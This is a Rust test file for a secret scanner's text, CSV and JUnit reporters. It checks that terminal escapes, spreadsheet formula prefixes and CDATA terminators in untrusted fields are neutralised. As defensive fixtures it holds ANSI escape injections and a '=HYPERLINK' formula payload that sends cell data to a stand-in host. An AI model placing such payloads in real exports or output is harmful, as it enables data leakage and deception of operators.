//! Gap coverage: injection-hardening in the three text-ish reporters.
//!
//! - `TextReporter` must replace terminal-control bytes (C0 incl. ESC/CR/LF/TAB,
//!   DEL 0x7F, and the C1 range 0x80-0x9F) in every untrusted display field with
//!   the visible replacement char U+FFFD so a crafted git author / file path /
//!   metadata / redacted credential cannot inject ANSI escapes, cursor moves, or
//!   CR-overwrites into the operator's terminal.
//! - `CsvReporter` must neutralize spreadsheet formula-injection prefixes
//!   (`=`,`+`,`-`,`@`, leading TAB/CR) with a single-quote guard, then apply
//!   RFC-4180 quoting.
//! - `JunitReporter` must split the CDATA terminator `]]>` across two CDATA
//!   sections so an attacker-controlled field cannot close the section early.
//!
//! Every expected value here is derived by reading
//! crates/core/src/report/{text,csv,junit}.rs and crates/core/src/finding.rs.

use crate::support::reporters::{CsvReporter, JunitReporter};
use keyhog_core::{MatchLocation, Severity, VerificationResult, VerifiedFinding};
use std::borrow::Cow;
use std::collections::HashMap;
use std::sync::Arc;

const REPL: char = '\u{FFFD}';

// ---------------------------------------------------------------------------
// Builders + render helpers
// ---------------------------------------------------------------------------

/// A baseline benign finding. Individual tests mutate the one field they probe.
fn base_finding() -> VerifiedFinding {
    VerifiedFinding {
        detector_id: Arc::from("aws-access-key"),
        detector_name: Arc::from("AWS Access Key"),
        service: Arc::from("aws"),
        severity: Severity::High,
        credential_redacted: Cow::Borrowed("AKIA...7XYA"),
        credential_hash: [0xab; 32],
        location: MatchLocation {
            source: Arc::from("filesystem"),
            file_path: Some(Arc::from("config/app.env")),
            line: Some(42),
            offset: 7,
            commit: None,
            author: None,
            date: None,
        },
        verification: VerificationResult::Live,
        metadata: HashMap::new(),
        additional_locations: vec![],
        confidence: Some(0.5),
    }
}

fn render_text(finding: &VerifiedFinding) -> String {
    let mut buf: Vec<u8> = Vec::new();
    {
        // color=false: the only ESC bytes in output then come from data, not styling.
        let mut reporter = crate::support::reporters::TextReporter::with_color(&mut buf, false);
        reporter.report(finding).expect("text report");
        reporter.finish().expect("text finish");
    }
    String::from_utf8(buf).expect("utf8 text output")
}

fn render_csv(finding: &VerifiedFinding) -> String {
    let mut buf: Vec<u8> = Vec::new();
    {
        let mut reporter = CsvReporter::new(&mut buf).expect("new csv reporter");
        reporter.report(finding).expect("csv report");
        reporter.finish().expect("csv finish");
    }
    String::from_utf8(buf).expect("utf8 csv output")
}

fn render_junit(finding: &VerifiedFinding) -> String {
    let mut buf: Vec<u8> = Vec::new();
    {
        let mut reporter = JunitReporter::new(&mut buf);
        reporter.report(finding).expect("junit report");
        reporter.finish().expect("junit finish");
    }
    String::from_utf8(buf).expect("utf8 junit output")
}

/// The single data row of a CSV render (header is line 0).
fn csv_data_row(out: &str) -> String {
    out.lines().nth(1).expect("csv data row").to_string()
}

// ===========================================================================
// TEXT REPORTER: terminal-control sanitization
// ===========================================================================

#[test]
fn text_color_false_emits_no_escape_for_clean_finding() {
    // With color disabled and no control chars in data, the entire render must
    // be free of the ESC byte 0x1B. This anchors later assertions that any ESC
    // present came from un-sanitized data.
    let out = render_text(&base_finding());
    assert!(
        !out.contains('\x1b'),
        "clean color=false render leaked an ESC byte: {out:?}"
    );
}

#[test]
fn text_sanitizes_esc_in_redacted_credential() {
    let mut f = base_finding();
    // Classic ANSI colour-reset injection attempt inside the redacted preview.
    f.credential_redacted = Cow::Owned("AK\x1b[31mIA".to_string());
    let out = render_text(&f);
    assert!(
        !out.contains('\x1b'),
        "ESC survived sanitize_terminal in credential_redacted: {out:?}"
    );
    // 0x1B -> U+FFFD; the rest of the bytes are preserved verbatim.
    assert!(
        out.contains(&format!("AK{REPL}[31mIA")),
        "expected ESC replaced by U+FFFD, got: {out:?}"
    );
}

#[test]
fn text_sanitizes_cr_in_redacted_credential() {
    // A bare CR (0x0D) would let the field overwrite the start of the line in a
    // terminal. It must become U+FFFD, not a literal carriage return.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("real\rFAKE".to_string());
    let out = render_text(&f);
    assert!(
        !out.contains('\r'),
        "raw CR survived in text output: {out:?}"
    );
    assert!(
        out.contains(&format!("real{REPL}FAKE")),
        "CR not replaced by U+FFFD: {out:?}"
    );
}

#[test]
fn text_sanitizes_embedded_newline_in_credential() {
    // An embedded LF (0x0A) is a C0 control (< 0x20) and is sanitized to U+FFFD
    // *inside the value*, so it cannot forge an extra visual report line.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("line1\nline2".to_string());
    let out = render_text(&f);
    assert!(
        out.contains(&format!("line1{REPL}line2")),
        "embedded LF not replaced by U+FFFD: {out:?}"
    );
}

#[test]
fn text_sanitizes_tab_in_credential() {
    // TAB (0x09) is < 0x20, so it is a terminal-control char and is replaced.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("a\tb".to_string());
    let out = render_text(&f);
    assert!(
        out.contains(&format!("a{REPL}b")),
        "TAB not replaced by U+FFFD: {out:?}"
    );
    assert!(!out.contains('\t'), "raw TAB survived: {out:?}");
}

#[test]
fn text_sanitizes_nul_in_credential() {
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("a\u{0}b".to_string());
    let out = render_text(&f);
    assert!(
        out.contains(&format!("a{REPL}b")),
        "NUL not replaced by U+FFFD: {out:?}"
    );
    assert!(!out.contains('\u{0}'), "raw NUL survived: {out:?}");
}

#[test]
fn text_sanitizes_del_0x7f_in_credential() {
    // DEL (0x7F) is explicitly listed in is_terminal_control.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("a\u{7F}b".to_string());
    let out = render_text(&f);
    assert!(
        out.contains(&format!("a{REPL}b")),
        "DEL not replaced by U+FFFD: {out:?}"
    );
    assert!(!out.contains('\u{7F}'), "raw DEL survived: {out:?}");
}

#[test]
fn text_sanitizes_c1_low_boundary_0x80() {
    // 0x80 is the inclusive low end of the C1 range 0x80..=0x9F.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("a\u{80}b".to_string());
    let out = render_text(&f);
    assert!(
        out.contains(&format!("a{REPL}b")),
        "C1 0x80 not replaced by U+FFFD: {out:?}"
    );
    assert!(!out.contains('\u{80}'), "raw 0x80 survived: {out:?}");
}

#[test]
fn text_sanitizes_c1_high_boundary_0x9f() {
    // 0x9F is the inclusive high end of the C1 range; CSI (0x9B) lives inside it.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("a\u{9F}b".to_string());
    let out = render_text(&f);
    assert!(
        out.contains(&format!("a{REPL}b")),
        "C1 0x9F not replaced by U+FFFD: {out:?}"
    );
    assert!(!out.contains('\u{9F}'), "raw 0x9F survived: {out:?}");
}

#[test]
fn text_sanitizes_c1_csi_0x9b() {
    // 0x9B is the 8-bit CSI introducer - a single-byte ANSI escape.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("a\u{9B}31mb".to_string());
    let out = render_text(&f);
    assert!(
        out.contains(&format!("a{REPL}31mb")),
        "C1 CSI 0x9B not replaced by U+FFFD: {out:?}"
    );
}

#[test]
fn text_preserves_char_just_below_c1_0x7e_tilde() {
    // 0x7E ('~') is below DEL and outside every control range: must pass through.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("a~b".to_string());
    let out = render_text(&f);
    assert!(
        out.contains("a~b"),
        "printable '~' (0x7E) was wrongly altered: {out:?}"
    );
}

#[test]
fn text_preserves_char_just_above_c1_0xa0_nbsp() {
    // 0xA0 (NBSP) is one past the C1 upper bound 0x9F: must NOT be sanitized.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("a\u{A0}b".to_string());
    let out = render_text(&f);
    assert!(
        out.contains("a\u{A0}b"),
        "NBSP (0xA0) just above C1 range was wrongly replaced: {out:?}"
    );
    assert!(
        !out.contains(&format!("a{REPL}b")),
        "NBSP must not become U+FFFD: {out:?}"
    );
}

#[test]
fn text_preserves_space_0x20_boundary() {
    // 0x20 (space) is the first non-control byte (the check is `u < 0x20`).
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("a b".to_string());
    let out = render_text(&f);
    assert!(
        out.contains("a b"),
        "space (0x20) at the control boundary was altered: {out:?}"
    );
}

#[test]
fn text_preserves_unicode_printable_emoji() {
    // High Unicode well outside any control range passes through unchanged and
    // is not mistaken for a C1 byte.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("key\u{1F600}end".to_string());
    let out = render_text(&f);
    assert!(
        out.contains("key\u{1F600}end"),
        "emoji wrongly altered by sanitizer: {out:?}"
    );
}

#[test]
fn text_sanitizes_esc_in_author() {
    let mut f = base_finding();
    f.location.author = Some(Arc::from("Eve\x1b[2J"));
    let out = render_text(&f);
    assert!(!out.contains('\x1b'), "ESC survived in author: {out:?}");
    assert!(
        out.contains(&format!("Eve{REPL}[2J")),
        "author ESC not replaced: {out:?}"
    );
}

#[test]
fn text_sanitizes_esc_in_commit() {
    let mut f = base_finding();
    f.location.commit = Some(Arc::from("deadbeef\x1b[0m"));
    let out = render_text(&f);
    assert!(!out.contains('\x1b'), "ESC survived in commit: {out:?}");
    assert!(
        out.contains(&format!("deadbeef{REPL}[0m")),
        "commit ESC not replaced: {out:?}"
    );
}

#[test]
fn text_sanitizes_esc_in_date() {
    let mut f = base_finding();
    f.location.date = Some(Arc::from("2026\x1b[31m-01"));
    let out = render_text(&f);
    assert!(!out.contains('\x1b'), "ESC survived in date: {out:?}");
    assert!(
        out.contains(&format!("2026{REPL}[31m-01")),
        "date ESC not replaced: {out:?}"
    );
}

#[test]
fn text_sanitizes_esc_in_file_path_location() {
    // The file_path:line location line runs through sanitize_terminal too.
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("src/\x1b[31mevil.rs"));
    f.location.line = Some(9);
    let out = render_text(&f);
    assert!(!out.contains('\x1b'), "ESC survived in file path: {out:?}");
    assert!(
        out.contains(&format!("src/{REPL}[31mevil.rs:9")),
        "sanitized path:line not found: {out:?}"
    );
}

#[test]
fn text_strips_unc_prefix_then_sanitizes() {
    // The shared display helper removes the literal `\\?\` Win32 prefix BEFORE
    // sanitize; an ESC after the prefix is still replaced and the prefix itself
    // is gone.
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("\\\\?\\C:\\a\x1b[0mb"));
    f.location.line = None;
    let out = render_text(&f);
    assert!(!out.contains("\\\\?\\"), "UNC prefix not stripped: {out:?}");
    assert!(!out.contains('\x1b'), "ESC survived in UNC path: {out:?}");
    // After strip: `C:\a` + ESC + `[0mb`; ESC -> U+FFFD, the rest verbatim.
    assert!(
        out.contains(&format!("C:\\a{REPL}[0mb")),
        "stripped+sanitized path not found: {out:?}"
    );
}

#[test]
fn text_sanitizes_esc_in_source_when_no_path() {
    // When file_path and line are both None, format_location falls back to and
    // sanitizes location.source.
    let mut f = base_finding();
    f.location.file_path = None;
    f.location.line = None;
    f.location.source = Arc::from("stdin\x1b[Khdr");
    let out = render_text(&f);
    assert!(!out.contains('\x1b'), "ESC survived in source: {out:?}");
    // Only the ESC byte (0x1B) is a terminal control; the '[' (0x5B), 'K' (0x4B),
    // and trailing bytes are printable and pass through verbatim, so the
    // `\x1b[K` (erase-to-EOL) sequence becomes U+FFFD + literal "[Khdr".
    assert!(
        out.contains(&format!("stdin{REPL}[Khdr")),
        "sanitized source not found: {out:?}"
    );
}

#[test]
fn text_sanitizes_metadata_key_and_value() {
    // Both the metadata key (after `{}:` formatting) and its value are sanitized.
    let mut f = base_finding();
    let mut md = HashMap::new();
    md.insert("ke\x1by".to_string(), "va\x1blue".to_string());
    f.metadata = md;
    let out = render_text(&f);
    assert!(!out.contains('\x1b'), "ESC survived in metadata: {out:?}");
    // Key is sanitized then suffixed with ':' inside a `{:<11}` pad.
    assert!(
        out.contains(&format!("ke{REPL}y:")),
        "metadata key not sanitized: {out:?}"
    );
    assert!(
        out.contains(&format!("va{REPL}lue")),
        "metadata value not sanitized: {out:?}"
    );
}

#[test]
fn text_clean_path_borrows_value_verbatim() {
    // No control char anywhere -> sanitize_terminal borrows and emits the exact
    // bytes. Confirms the redacted credential is preserved byte-for-byte.
    let mut f = base_finding();
    f.credential_redacted = Cow::Borrowed("ghp_abc...wxyz");
    let out = render_text(&f);
    assert!(
        out.contains("ghp_abc...wxyz"),
        "clean credential not emitted verbatim: {out:?}"
    );
    assert!(
        !out.contains(REPL),
        "spurious U+FFFD on clean path: {out:?}"
    );
}

#[test]
fn text_multiple_controls_each_replaced_individually() {
    // Each control char maps to exactly one U+FFFD (1:1 char mapping).
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("\x1b\r\n\t\u{7F}".to_string());
    let out = render_text(&f);
    let needle: String = std::iter::repeat(REPL).take(5).collect();
    assert!(
        out.contains(&needle),
        "5 controls must map to 5 consecutive U+FFFD: {out:?}"
    );
}

#[test]
fn text_property_only_control_chars_become_fffd() {
    // Property: for a generated mix of control and printable chars in the
    // credential field, the sanitized substring has U+FFFD exactly where a
    // control char was and the original char everywhere else.
    let printables = ['A', 'z', '0', '~', ' ', '\u{A0}', '\u{1F600}'];
    let controls = [
        '\x00', '\x09', '\x0a', '\x0d', '\x1b', '\u{7F}', '\u{80}', '\u{9F}',
    ];
    for seed in 0u32..64 {
        let mut s = String::new();
        let mut expected = String::new();
        let mut bits = seed;
        for i in 0..6u32 {
            let pick_control = bits & 1 == 1;
            bits >>= 1;
            if pick_control {
                let c = controls[(seed.wrapping_add(i) as usize) % controls.len()];
                s.push(c);
                expected.push(REPL);
            } else {
                let c = printables[(seed.wrapping_add(i) as usize) % printables.len()];
                s.push(c);
                expected.push(c);
            }
        }
        // Frame with stable markers so we can locate the sanitized region.
        let cred = format!("[{s}]");
        let want = format!("[{expected}]");
        let mut f = base_finding();
        f.credential_redacted = Cow::Owned(cred.clone());
        let out = render_text(&f);
        assert!(
            out.contains(&want),
            "seed {seed}: sanitized {cred:?} should render as {want:?} in {out:?}"
        );
    }
}

// ===========================================================================
// CSV REPORTER: formula-injection neutralization + RFC-4180 quoting
// ===========================================================================

#[test]
fn csv_header_is_exact_and_first_line() {
    let out = render_csv(&base_finding());
    let header = out.lines().next().expect("csv header line");
    assert_eq!(
        header,
        "detector_id,detector_name,service,severity,credential_redacted,credential_hash,source,file_path,line,offset,commit,author,date,verification,confidence",
        "CSV header drifted"
    );
}

#[test]
fn csv_guards_eq_prefix_in_file_path() {
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("=1+1"));
    let out = render_csv(&f);
    let row = csv_data_row(&out);
    assert!(
        row.split(',').any(|c| c == "'=1+1"),
        "'=' prefix not guarded with leading quote: {row:?}"
    );
    assert!(
        !row.split(',').any(|c| c == "=1+1"),
        "raw '=' formula leaked as a bare cell: {row:?}"
    );
}

#[test]
fn csv_guards_plus_prefix() {
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("+1"));
    let row = csv_data_row(&render_csv(&f));
    assert!(
        row.split(',').any(|c| c == "'+1"),
        "'+' not guarded: {row:?}"
    );
}

#[test]
fn csv_guards_minus_prefix() {
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("-1"));
    let row = csv_data_row(&render_csv(&f));
    assert!(
        row.split(',').any(|c| c == "'-1"),
        "'-' not guarded: {row:?}"
    );
}

#[test]
fn csv_guards_at_prefix() {
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("@SUM(A1)"));
    let row = csv_data_row(&render_csv(&f));
    assert!(
        row.split(',').any(|c| c == "'@SUM(A1)"),
        "'@' not guarded: {row:?}"
    );
}

#[test]
fn csv_guards_leading_tab_and_quotes_it() {
    // A leading TAB triggers the guard prefix; then `neutralized` still contains
    // the TAB... but TAB is NOT in the quoting trigger set (`,` `"` `\n` `\r`),
    // so the cell is guarded-but-NOT-quoted: it appears as a bare `'\t...`.
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("\tlead"));
    let out = render_csv(&f);
    let row = csv_data_row(&out);
    assert!(
        row.contains("'\tlead"),
        "leading TAB must be quote-guarded: {row:?}"
    );
    // No RFC-4180 double-quote wrapping is applied for a lone TAB.
    assert!(
        !row.contains("\"'\tlead"),
        "TAB-only value must not gain double-quote wrapping: {row:?}"
    );
}

#[test]
fn csv_guards_leading_cr_and_forces_quoting() {
    // A leading CR triggers BOTH the guard prefix AND RFC-4180 quoting (CR is in
    // the quoting trigger set). Result: `"'\rlead"` wrapped in double quotes.
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("\rlead"));
    let out = render_csv(&f);
    assert!(
        out.contains("\"'\rlead\""),
        "leading CR must be guarded AND double-quote wrapped: {out:?}"
    );
}

#[test]
fn csv_does_not_guard_benign_alpha_path() {
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("config/app.env"));
    let row = csv_data_row(&render_csv(&f));
    assert!(
        row.split(',').any(|c| c == "config/app.env"),
        "benign path must be emitted unmodified: {row:?}"
    );
    assert!(
        !row.contains("'config"),
        "benign path gained a spurious guard: {row:?}"
    );
}

#[test]
fn csv_does_not_guard_interior_equals() {
    // Only the FIRST byte triggers the guard; an '=' in the middle is benign.
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("a=b"));
    let row = csv_data_row(&render_csv(&f));
    assert!(
        row.split(',').any(|c| c == "a=b"),
        "interior '=' must not be guarded: {row:?}"
    );
}

#[test]
fn csv_quotes_field_containing_comma() {
    // A comma forces RFC-4180 quoting but the value does not start with a
    // formula trigger, so no leading quote-guard is added.
    let mut f = base_finding();
    f.location.author = Some(Arc::from("Doe, John"));
    let out = render_csv(&f);
    assert!(
        out.contains("\"Doe, John\""),
        "comma field must be double-quote wrapped: {out:?}"
    );
    assert!(
        !out.contains("\"'Doe"),
        "comma-only field must not gain a formula guard: {out:?}"
    );
}

#[test]
fn csv_doubles_embedded_double_quotes() {
    let mut f = base_finding();
    f.location.author = Some(Arc::from("a\"b"));
    let out = render_csv(&f);
    assert!(
        out.contains("\"a\"\"b\""),
        "embedded quote must be doubled and wrapped: {out:?}"
    );
}

#[test]
fn csv_quotes_field_containing_newline() {
    let mut f = base_finding();
    f.location.author = Some(Arc::from("line1\nline2"));
    let out = render_csv(&f);
    assert!(
        out.contains("\"line1\nline2\""),
        "embedded LF must force RFC-4180 quoting: {out:?}"
    );
}

#[test]
fn csv_hyperlink_formula_guarded_and_quoted() {
    // Mirrors the real-world =HYPERLINK exfil payload: starts with '=', and
    // contains commas + quotes -> guarded ('=...) then quoted with doubled ".
    let mut f = base_finding();
    f.location.author = Some(Arc::from("=HYPERLINK(\"http://x/?\"&A1,\"go\")"));
    let out = render_csv(&f);
    assert!(
        out.contains("\"'=HYPERLINK(\"\"http://x/?\"\"&A1,\"\"go\"\")\""),
        "HYPERLINK payload must be guarded and quoted: {out:?}"
    );
}

#[test]
fn csv_empty_field_is_bare_and_unguarded() {
    // file_path None -> empty string: first() is None -> no guard, no quoting.
    let mut f = base_finding();
    f.location.file_path = None;
    let row = csv_data_row(&render_csv(&f));
    // The file_path column is the 8th (index 7). With author/commit/date None
    // and a benign path absent, there must be an empty cell, not "''" or "'".
    let fields: Vec<&str> = row.split(',').collect();
    assert_eq!(
        fields[7], "",
        "absent file_path must be an empty cell: {row:?}"
    );
}

#[test]
fn csv_multibyte_leading_char_not_guarded() {
    // The guard inspects `val.as_bytes().first()`, a single byte. A leading
    // multibyte UTF-8 char (e.g. U+2212 MINUS SIGN, bytes E2 88 92) has a first
    // byte of 0xE2, which matches none of =,+,-,@,\t,\r -> no guard.
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("\u{2212}1")); // unicode minus, not ASCII '-'
    let row = csv_data_row(&render_csv(&f));
    assert!(
        row.split(',').any(|c| c == "\u{2212}1"),
        "unicode-minus leading value must not be guarded: {row:?}"
    );
    assert!(
        !row.contains("'\u{2212}1"),
        "unicode minus wrongly treated as formula trigger: {row:?}"
    );
}

#[test]
fn csv_severity_renders_kebab_for_client_safe() {
    // Severity::ClientSafe renders via Display as "client-safe" (kebab), not
    // "clientsafe". The leading 'c' is not a formula trigger, so it is bare.
    let mut f = base_finding();
    f.severity = Severity::ClientSafe;
    let row = csv_data_row(&render_csv(&f));
    let fields: Vec<&str> = row.split(',').collect();
    // severity is column index 3.
    assert_eq!(fields[3], "client-safe", "severity column wrong: {row:?}");
}

#[test]
fn csv_verification_error_renders_with_prefix() {
    let mut f = base_finding();
    f.verification = VerificationResult::Error("boom".to_string());
    let out = render_csv(&f);
    // "error: boom" contains no comma/quote/newline, so it is a bare cell.
    let row = csv_data_row(&out);
    assert!(
        row.split(',').any(|c| c == "error: boom"),
        "verification error cell wrong: {row:?}"
    );
}

#[test]
fn csv_property_guard_iff_first_char_is_trigger() {
    // Property: across many first-chars, a leading single-quote guard appears
    // IFF the first byte is one of =,+,-,@,\t,\r.
    let triggers = ['=', '+', '-', '@', '\t', '\r'];
    let candidates = [
        '=', '+', '-', '@', '\t', '\r', 'a', 'Z', '0', '/', '.', '#', '!', ' ', '"', ',',
    ];
    for &first in &candidates {
        let payload = format!("{first}rest");
        let mut f = base_finding();
        // Use a column with no other quoting interplay where possible; author is
        // fine because 'rest' has no comma/quote. But '"' and ',' first chars
        // force quoting, so check the guard via the neutralized substring.
        f.location.author = Some(Arc::from(payload.as_str()));
        let out = render_csv(&f);
        let should_guard = triggers.contains(&first);
        let guarded_marker = format!("'{payload}");
        if should_guard {
            assert!(
                out.contains(&guarded_marker),
                "first char {first:?} should be guarded: {out:?}"
            );
        } else {
            // No guard: the bare payload must appear (possibly RFC-4180 quoted
            // for ',' and '"', but never with a leading single quote before it).
            assert!(
                !out.contains(&guarded_marker),
                "first char {first:?} must NOT be guarded: {out:?}"
            );
        }
    }
}

// ===========================================================================
// JUNIT REPORTER: CDATA terminator escaping + XML-attr escaping
// ===========================================================================

#[test]
fn junit_escapes_cdata_terminator_in_redacted_credential() {
    // The credential_redacted body goes through escape_cdata. A literal `]]>`
    // must be split as `]]]]><![CDATA[>` so it cannot close the CDATA early.
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("pre]]>post".to_string());
    let out = render_junit(&f);
    assert!(
        out.contains("pre]]]]><![CDATA[>post"),
        "CDATA terminator not split in redacted credential: {out:?}"
    );
    // The raw, unsplit terminator must not survive inside the value region.
    assert!(
        !out.contains("pre]]>post"),
        "raw ]]> terminator leaked through: {out:?}"
    );
}

#[test]
fn junit_escapes_cdata_terminator_in_author() {
    let mut f = base_finding();
    f.location.author = Some(Arc::from("Eve]]><x/>"));
    let out = render_junit(&f);
    assert!(
        out.contains("Eve]]]]><![CDATA[><x/>"),
        "author ]]> not split: {out:?}"
    );
    assert!(
        !out.contains("Author:        Eve]]><x/>"),
        "raw author terminator leaked: {out:?}"
    );
}

#[test]
fn junit_escapes_cdata_terminator_in_detector_name() {
    let mut f = base_finding();
    f.detector_name = Arc::from("Name]]>injected");
    let out = render_junit(&f);
    assert!(
        out.contains("Name]]]]><![CDATA[>injected"),
        "detector_name ]]> not split in CDATA body: {out:?}"
    );
}

#[test]
fn junit_escapes_cdata_terminator_in_file_path() {
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("a]]>b.rs"));
    let out = render_junit(&f);
    assert!(
        out.contains("File Path:     a]]]]><![CDATA[>b.rs"),
        "file path ]]> not split: {out:?}"
    );
}

#[test]
fn junit_escapes_cdata_terminator_in_commit_and_date() {
    let mut f = base_finding();
    f.location.commit = Some(Arc::from("c]]>m"));
    f.location.date = Some(Arc::from("d]]>t"));
    let out = render_junit(&f);
    assert!(
        out.contains("Commit:        c]]]]><![CDATA[>m"),
        "commit ]]> not split: {out:?}"
    );
    assert!(
        out.contains("Date:          d]]]]><![CDATA[>t"),
        "date ]]> not split: {out:?}"
    );
}

#[test]
fn junit_cdata_clean_value_unchanged() {
    // No `]]>` -> escape_cdata borrows; value passes through verbatim.
    let mut f = base_finding();
    f.credential_redacted = Cow::Borrowed("AKIA...7XYA");
    let out = render_junit(&f);
    assert!(
        out.contains("Redacted:      AKIA...7XYA"),
        "clean redacted value altered: {out:?}"
    );
    assert!(
        !out.contains("<![CDATA[>"),
        "no split-marker should appear for clean body: {out:?}"
    );
}

#[test]
fn junit_multiple_terminators_all_split() {
    let mut f = base_finding();
    f.credential_redacted = Cow::Owned("]]>x]]>".to_string());
    let out = render_junit(&f);
    assert!(
        out.contains("Redacted:      ]]]]><![CDATA[>x]]]]><![CDATA[>"),
        "both ]]> occurrences must be split: {out:?}"
    );
}

#[test]
fn junit_escapes_xml_attr_in_case_name_via_file_path() {
    // The testcase name embeds the file path and goes through escape_xml_attr:
    // `<`,`>`,`&`,`"`,`'` are entity-escaped (NOT CDATA-split, since it's an attr).
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("a<b>&\"'.rs"));
    f.location.line = Some(3);
    let out = render_junit(&f);
    // case_name = "<file>:<line>:<detector_id>" then attr-escaped.
    assert!(
        out.contains("name=\"a&lt;b&gt;&amp;&quot;&apos;.rs:3:aws-access-key\""),
        "case name attr not fully entity-escaped: {out:?}"
    );
}

#[test]
fn junit_escapes_xml_attr_ampersand_first() {
    // escape_xml_attr replaces '&' first, so a literal '&' becomes &amp; and is
    // not double-escaped from a later replacement.
    let mut f = base_finding();
    f.detector_name = Arc::from("A&B<C>");
    let out = render_junit(&f);
    // failure message attribute: "Secret detected: A&B<C> (id: ...)" escaped.
    assert!(
        out.contains("Secret detected: A&amp;B&lt;C&gt; (id: aws-access-key)"),
        "failure message attr not escaped correctly: {out:?}"
    );
}

#[test]
fn junit_severity_type_attr_is_escaped_display() {
    // The <failure type="..."> attribute is the severity Display string, escaped.
    let mut f = base_finding();
    f.severity = Severity::Critical;
    let out = render_junit(&f);
    assert!(
        out.contains("type=\"critical\""),
        "failure type attr should be the kebab severity: {out:?}"
    );
}

#[test]
fn junit_testsuite_counts_match_findings() {
    // Two findings -> tests=2 failures=2 in the testsuite element.
    let mut buf: Vec<u8> = Vec::new();
    {
        let mut reporter = JunitReporter::new(&mut buf);
        reporter.report(&base_finding()).expect("r1");
        reporter.report(&base_finding()).expect("r2");
        reporter.finish().expect("finish");
    }
    let out = String::from_utf8(buf).expect("utf8");
    assert!(
        out.contains(
            "<testsuite name=\"keyhog\" tests=\"2\" failures=\"2\" errors=\"0\" time=\"0.0\">"
        ),
        "testsuite counts wrong for 2 findings: {out:?}"
    );
}

#[test]
fn junit_empty_report_has_zero_counts_and_well_formed_shell() {
    let mut buf: Vec<u8> = Vec::new();
    {
        let mut reporter = JunitReporter::new(&mut buf);
        reporter.finish().expect("finish");
    }
    let out = String::from_utf8(buf).expect("utf8");
    assert!(out.starts_with("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"));
    assert!(
        out.contains("tests=\"0\" failures=\"0\" errors=\"0\""),
        "empty report counts wrong: {out:?}"
    );
    assert!(
        out.contains("</testsuites>"),
        "missing closing tag: {out:?}"
    );
}

#[test]
fn junit_attr_escaping_does_not_apply_cdata_split() {
    // A `]]>` inside the *attribute* (case name) is NOT split into CDATA halves;
    // escape_xml_attr leaves ']', ']', '>' -> '>' becomes &gt; only.
    let mut f = base_finding();
    f.location.file_path = Some(Arc::from("p]]>q"));
    f.location.line = Some(5);
    let out = render_junit(&f);
    assert!(
        out.contains("name=\"p]]&gt;q:5:aws-access-key\""),
        "attr should entity-escape '>' not CDATA-split: {out:?}"
    );
    assert!(
        !out.contains("name=\"p]]]]><![CDATA[>q"),
        "attr must NOT receive CDATA splitting: {out:?}"
    );
}

#[test]
fn junit_property_cdata_split_count_matches_terminator_count() {
    // Property: N copies of ]]> in a CDATA-bound field produce exactly N split
    // markers `]]]]><![CDATA[>` in the output body.
    for n in 0usize..6 {
        let payload = "x".to_string() + &"]]>".repeat(n);
        let mut f = base_finding();
        f.credential_redacted = Cow::Owned(payload);
        let out = render_junit(&f);
        let got = out.matches("]]]]><![CDATA[>").count();
        assert_eq!(
            got, n,
            "expected {n} split markers for {n} terminators, got {got}: {out:?}"
        );
    }
}
